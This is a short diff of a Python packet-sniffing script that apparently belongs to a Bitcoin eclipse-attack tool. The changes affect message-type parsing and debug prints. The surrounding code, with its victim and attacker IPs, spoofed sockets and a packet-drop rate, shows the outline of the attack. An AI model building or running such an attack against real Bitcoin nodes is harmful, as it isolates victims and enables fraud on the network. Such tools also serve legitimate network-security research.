@@ -177,27 +177,30 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 # Called when a packet is sniffed from the network
 def packet_received(packet):
 	try:
-		magic_number = packet.load[0:4]
+		magic_number = packet.load[:4]
 		if magic_number != b'\xf9\xbe\xb4\xd9':
 			return # Only allow Bitcoin messages (by verifying the global magic number)
 	except:
 		return
 
+
 	# Extract the message type
-	msgtype = packet.load[4:16].decode()
-	msgtype = re.sub('[^A-z0-9_]+', '', msgtype) # Remove strange \0's at the end
+	msgtype = packet.load[4:4+12].split(b"\x00", 1)[0].decode()
+	#packet.load[4:16].decode()
+	print(len(msgtype))
+	print(msgtype == 'ping')
+	#msgtype = re.sub('[^A-z0-9_]+', '', msgtype) # Remove all the \0's at the end
 	# Relay Bitcoin packets that aren't from the victim
 	if packet[IP].src == victim_ip:
 		print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msgtype}')
-		print(f'.{str(msgtype)}.{len(msgtype)}.{len(msgtype.strip())}')
-		print(msgtype is 'ping')
+
 		if msgtype == 'ping':
 			payload = packet[TCP].payload
 			msg = MsgSerializable.from_bytes(bytes(payload))
 			print(msg)
 			print(type(msg))
 			# send pong
-			pass
+
 	elif packet[IP].dst == attacker_ip:
 		if len(spoof_IP_sockets) > 0:
 			if random.random() > eclipse_packet_drop_rate:
